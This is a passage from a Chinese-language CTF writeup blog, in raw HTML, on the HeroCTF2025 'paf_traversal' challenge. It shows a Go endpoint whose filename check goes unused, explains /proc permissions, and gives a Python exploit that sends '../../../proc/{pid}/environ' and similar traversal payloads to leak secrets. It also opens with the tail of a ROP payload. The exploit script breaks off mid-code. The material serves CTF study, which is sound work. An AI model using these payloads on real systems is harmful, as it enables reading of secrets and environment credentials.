0x197031) + p64(libc_base + 0x277e5 + 1) + p64(libc_base + 0x4c490) + p64(0) * 2 sla(\"Description : \", payload2) sh.interactive() ","wordCount":"2503","inLanguage":"en","image":"https://wgggggggg.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2025-12-01T23:30:00+08:00","dateModified":"2025-12-01T23:30:00+08:00","author":{"@type":"Person","name":"Me"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://wgggggggg.github.io/posts/ctf/heroctf2025-writeup/"},"publisher":{"@type":"Organization","name":"Wgg's Blog Site","logo":{"@type":"ImageObject","url":"https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://wgggggggg.github.io/ accesskey=h title="Wgg (Alt + H)"><img src=https://wgggggggg.github.io/apple-touch-icon.png alt aria-label=logo height=35>Wgg</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://wgggggggg.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://wgggggggg.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://example.org title=example.org><span>example.org</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://wgggggggg.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://wgggggggg.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">HeroCTF2025 PWN Writeup</h1><div class=post-meta><span title='2025-12-01 23:30:00 +0800 CST'>December 1, 2025</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;2503 words&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/CTF/HeroCTF2025-WriteUp/index.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><h2 id=paf_traversal>paf_traversal<a hidden class=anchor aria-hidden=true href=#paf_traversal>#</a></h2><h3 id=漏洞点>漏洞点<a hidden class=anchor aria-hidden=true href=#漏洞点>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kd>func</span> <span class=nf>HandleDownloadWordlist</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>wordlistDir</span> <span class=o>:=</span> <span class=nf>getWordlistDir</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>json</span> <span class=o>:=</span> <span class=nx>DownloadRequest</span><span class=p>{}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>ShouldBindJSON</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>json</span><span class=p>);</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusBadRequest</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;error&#34;</span><span class=p>:</span> <span class=nx>err</span><span class=p>.</span><span class=nf>Error</span><span class=p>()})</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>fileName</span> <span class=o>:=</span> <span class=nx>path</span><span class=p>.</span><span class=nf>Base</span><span class=p>(</span><span class=nx>json</span><span class=p>.</span><span class=nx>Filename</span><span class=p>)</span>  <span class=c1>// LINE 46: Sanitized but UNUSED!</span>
</span></span><span class=line><span class=cl>    <span class=nx>filePath</span> <span class=o>:=</span> <span class=nx>filepath</span><span class=p>.</span><span class=nf>Join</span><span class=p>(</span><span class=nx>wordlistDir</span><span class=p>,</span> <span class=nx>json</span><span class=p>.</span><span class=nx>Filename</span><span class=p>)</span>  <span class=c1>// LINE 47: Uses unsanitized input!</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>f</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>Open</span><span class=p>(</span><span class=nx>filePath</span><span class=p>)</span>  <span class=c1>// LINE 49: Opens the unsanitized path</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusInternalServerError</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;error&#34;</span><span class=p>:</span> <span class=nx>err</span><span class=p>.</span><span class=nf>Error</span><span class=p>()})</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>defer</span> <span class=nx>f</span><span class=p>.</span><span class=nf>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>data</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>io</span><span class=p>.</span><span class=nf>ReadAll</span><span class=p>(</span><span class=nx>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusInternalServerError</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;error&#34;</span><span class=p>:</span> <span class=nx>err</span><span class=p>.</span><span class=nf>Error</span><span class=p>()})</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusOK</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;filename&#34;</span><span class=p>:</span> <span class=nx>fileName</span><span class=p>,</span>  <span class=c1>// Returns sanitized name</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;content&#34;</span><span class=p>:</span>  <span class=nb>string</span><span class=p>(</span><span class=nx>data</span><span class=p>),</span>  <span class=c1>// But returns content from unsanitized path!</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><strong>Key Issue</strong>: Line 46 calls <code>path.Base(json.Filename)</code> to sanitize the filename, but this result is stored in <code>fileName</code> and only used for the response. Line 47 uses the <strong>original unsanitized</strong> <code>json.Filename</code> to construct the file path, allowing path traversal!</p><h3 id=利用>利用<a hidden class=anchor aria-hidden=true href=#利用>#</a></h3><p>有路径穿越的bug，但是我们再来看看<code>entrypoints.sh</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;</span><span class=si>${</span><span class=nv>FLAG</span><span class=k>:-</span><span class=nv>HEROCTF_FAKE_FLAG</span><span class=si>}</span><span class=s2>&#34;</span> &gt; <span class=s2>&#34;/app/flag_</span><span class=k>$(</span>openssl rand -hex 8<span class=k>)</span><span class=s2>.txt&#34;</span>
</span></span><span class=line><span class=cl>chmod <span class=m>444</span> /app/flag_*.txt
</span></span><span class=line><span class=cl><span class=nb>unset</span> FLAG
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/app/cracker/cracker <span class=p>&amp;</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> /app/api/ <span class=o>&amp;&amp;</span> ./api
</span></span></code></pre></div><p>存放flag文件的名字是随机的，爆破也很难</p><p>再来看看<code>Dockerfile</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-dockerfile data-lang=dockerfile><span class=line><span class=cl><span class=c># =&gt; BUILDER</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>FROM</span><span class=s> golang:1.25-trixie@sha256:a02d35efc036053fdf0da8c15919276bf777a80cbfda6a35c5e9f087e652adfc AS builder</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> apt-get update <span class=o>&amp;&amp;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    apt-get install -y --no-install-recommends build-essential make ca-certificates libssl-dev <span class=o>&amp;&amp;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    rm -rf /var/lib/apt/lists/*<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>WORKDIR</span><span class=s> /src</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> ./api/ ./api/<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> ./cracker/ ./cracker/<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c># Build the Go binary</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>WORKDIR</span><span class=s> /src/api/</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> <span class=nv>CGO_ENABLED</span><span class=o>=</span><span class=m>0</span> <span class=nv>GOOS</span><span class=o>=</span>linux <span class=nv>GOARCH</span><span class=o>=</span>amd64 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    go build -ldflags<span class=o>=</span><span class=s2>&#34;-s -w&#34;</span> -o api .<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c># Build the C binary</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>WORKDIR</span><span class=s> /src/cracker</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> make<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c># =&gt; RUNTIME</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>FROM</span><span class=s> debian:trixie@sha256:8f6a88feef3ed01a300dafb87f208977f39dccda1fd120e878129463f7fa3b8f AS runtime</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> apt-get update <span class=o>&amp;&amp;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    apt-get install -y --no-install-recommends openssl <span class=o>&amp;&amp;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    rm -rf /var/lib/apt/lists/*<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> useradd -m app -d /app/<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> ./entrypoint.sh /entrypoint.sh<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c># COPY --from=builder /src/api/ /app/api/</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c># COPY --from=builder /src/cracker/ /app/cracker/</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> ./api/ /app/api/<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> ./cracker/ /app/cracker/<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> chmod +x /entrypoint.sh <span class=o>&amp;&amp;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    chown app:app -R /app/<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>USER</span><span class=s> app</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>WORKDIR</span><span class=s> /app/</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>CMD</span> <span class=p>[</span><span class=s2>&#34;/entrypoint.sh&#34;</span><span class=p>]</span><span class=err>
</span></span></span></code></pre></div><p>其中<code>entrypoint.sh</code>是root权限运行的，那么<code>./api</code>有着root权限</p><blockquote><p>在 Linux 系统中（包括 Docker 容器），PID 1 是<strong>第一个启动的进程</strong>，它通常是系统的 <strong>init</strong> 或 <strong>entrypoint</strong> 进程</p></blockquote><blockquote><p><strong><code>/proc</code> 文件系统：</strong> <code>/proc</code> 是一个虚拟文件系统，用于提供关于内核和进程的信息。<code>/proc/1</code> 目录包含了关于 PID 1 进程的所有信息（例如其命令行、文件描述符、内存使用情况等）。</p></blockquote><blockquote><p><code>/proc</code> 文件系统的读取权限在 Linux 中设计得非常精妙，旨在提供进程信息的同时，保护敏感数据。</p><hr><h3 id=proc-文件系统的基本读取权限><strong><code>/proc</code> 文件系统的基本读取权限</strong><a hidden class=anchor aria-hidden=true href=#proc-文件系统的基本读取权限>#</a></h3><p><code>/proc</code> 目录下的权限主要依赖于文件或目录所关联的 <strong>进程所有者</strong> 和 <strong>当前访问用户</strong>。</p><h4 id=1-主目录权限-proc><strong>1. 主目录权限 (<code>/proc</code>)</strong><a hidden class=anchor aria-hidden=true href=#1-主目录权限-proc>#</a></h4><ul><li><strong>权限:</strong> 默认权限通常是 <code>dr-xr-xr-x</code> (即 555)。</li><li><strong>含义:</strong> 所有人都可以进入 <code>/proc</code> 目录并查看其内容（主要是列出进程 ID 目录）。</li></ul><h4 id=2-进程信息目录-procpid><strong>2. 进程信息目录 (<code>/proc/[PID]</code>)</strong><a hidden class=anchor aria-hidden=true href=#2-进程信息目录-procpid>#</a></h4><p>这是最关键的部分，例如 <code>/proc/1</code> 或 <code>/proc/1234</code>。</p><table><thead><tr><th><strong>目录/文件</strong></th><th><strong>权限所有者</strong></th><th><strong>可读取的用户</strong></th><th><strong>备注</strong></th></tr></thead><tbody><tr><td><code>/proc/[PID]</code></td><td>该 PID 进程的 <strong>所有者</strong></td><td><strong>所有者</strong> 和 <strong>Root (UID 0)</strong></td><td>只有 Root 或进程所有者可以查看大部分敏感子文件。</td></tr><tr><td><code>/proc/[PID]/cmdline</code></td><td>该 PID 进程的 <strong>所有者</strong></td><td><strong>任何人</strong></td><td>所有人都可以读取进程的命令行参数。</td></tr><tr><td><code>/proc/[PID]/exe</code></td><td>该 PID 进程的 <strong>所有者</strong></td><td><strong>Root</strong></td><td>链接到执行文件，通常只有 Root 可以跟随链接（防止普通用户获取不属于他们的程序）。</td></tr><tr><td><code>/proc/[PID]/environ</code></td><td>该 PID 进程的 <strong>所有者</strong></td><td><strong>Root</strong></td><td>包含进程的环境变量，通常只有 Root 可以读取，因为它可能包含密码或敏感 token。</td></tr><tr><td><code>/proc/[PID]/fd/*</code></td><td>该 PID 进程的 <strong>所有者</strong></td><td><strong>Root</strong></td><td>文件描述符目录，通常只有 Root 或进程所有者可以查看。</td></tr></tbody></table></blockquote><p>换句话说，我们可以读取<code>/proc/1/environ</code>来获取<code>entrypoint.sh</code>启动时的<code>FLAG</code>环境变量</p><p>由此便可以得到<code>FLAG</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>Improved exploit for paf_traversal CTF challenge
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>Key insights:
</span></span></span><span class=line><span class=cl><span class=s2>1. Download endpoint has path traversal
</span></span></span><span class=line><span class=cl><span class=s2>2. Cracker reads wordlist files and prints each line
</span></span></span><span class=line><span class=cl><span class=s2>3. Need to enumerate /proc to find flag file or leak filename
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>typing</span> <span class=kn>import</span> <span class=n>Optional</span><span class=p>,</span> <span class=n>List</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Exploit</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>base_url</span><span class=p>:</span> <span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>base_url</span> <span class=o>=</span> <span class=n>base_url</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>session</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>download_file</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>path</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Optional</span><span class=p>[</span><span class=nb>str</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Exploit path traversal in /api/wordlist/download&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>url</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>base_url</span><span class=si>}</span><span class=s2>/api/wordlist/download&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;filename&#34;</span><span class=p>:</span> <span class=n>path</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>resp</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>payload</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>resp</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>data</span> <span class=o>=</span> <span class=n>resp</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;content&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>enumerate_proc_pids</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>max_pid</span><span class=p>:</span> <span class=nb>int</span> <span class=o>=</span> <span class=mi>100</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>List</span><span class=p>[</span><span class=nb>int</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Find active PIDs by trying to read /proc/[pid]/cmdline&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] Enumerating PIDs in /proc (1-</span><span class=si>{</span><span class=n>max_pid</span><span class=si>}</span><span class=s2>)...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>active_pids</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>pid</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>max_pid</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>content</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>download_file</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;../../../proc/</span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s2>/cmdline&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>content</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=c1># Clean up cmdline (null-separated)</span>
</span></span><span class=line><span class=cl>                <span class=n>cmdline</span> <span class=o>=</span> <span class=n>content</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39; &#39;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>cmdline</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  [+] PID </span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>cmdline</span><span class=p>[:</span><span class=mi>80</span><span class=p>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>active_pids</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>pid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>active_pids</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>check_proc_maps</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>pid</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Optional</span><span class=p>[</span><span class=nb>str</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Check /proc/[pid]/maps for memory mappings - might show flag file&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] Checking /proc/</span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s2>/maps...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>download_file</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;../../../proc/</span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s2>/maps&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>content</span> <span class=ow>and</span> <span class=s2>&#34;flag_&#34;</span> <span class=ow>in</span> <span class=n>content</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Found &#39;flag_&#39; reference in maps!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>matches</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;flag_([0-9a-f]</span><span class=si>{8}</span><span class=s1>)\.txt&#39;</span><span class=p>,</span> <span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>matches</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>matches</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>check_proc_environ</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>pid</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Optional</span><span class=p>[</span><span class=nb>str</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Check /proc/[pid]/environ for environment variables&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] Checking /proc/</span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s2>/environ...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>download_file</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;../../../proc/</span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s2>/environ&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>content</span> <span class=ow>and</span> <span class=s2>&#34;flag_&#34;</span> <span class=ow>in</span> <span class=n>content</span><span class=o>.</span><span class=n>lower</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Found &#39;flag&#39; in environ!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># Parse null-separated environ</span>
</span></span><span class=line><span class=cl>            <span class=n>env_vars</span> <span class=o>=</span> <span class=n>content</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>var</span> <span class=ow>in</span> <span class=n>env_vars</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=s1>&#39;flag&#39;</span> <span class=ow>in</span> <span class=n>var</span><span class=o>.</span><span class=n>lower</span><span class=p>():</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;    </span><span class=si>{</span><span class=n>var</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>matches</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;flag_([0-9a-f]</span><span class=si>{8}</span><span class=s1>)\.txt&#39;</span><span class=p>,</span> <span class=n>var</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>matches</span><span class=p>:</span>
